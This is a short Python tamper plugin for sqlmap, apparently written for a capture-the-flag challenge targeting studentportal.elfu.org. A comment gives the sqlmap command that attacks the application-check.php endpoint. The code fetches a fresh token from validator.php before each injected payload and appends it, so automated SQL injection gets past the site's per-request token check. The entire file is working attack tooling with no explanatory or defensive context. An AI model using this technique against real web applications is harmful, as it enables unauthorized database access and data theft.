#!/usr/bin/env python
#run with sqlmap -u 'https://studentportal.elfu.org/application-check.php?elfmail=a@a' --skip-urlencode 

from lib.core.data import kb
from lib.core.enums import PRIORITY

import requests
import urllib

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):

    token = urllib.quote_plus(requests.get('https://studentportal.elfu.org/validator.php').text)
    retVal = urllib.quote_plus(payload)+"&token="+token
    retVal = retVal.encode("utf-8")
    return retVal
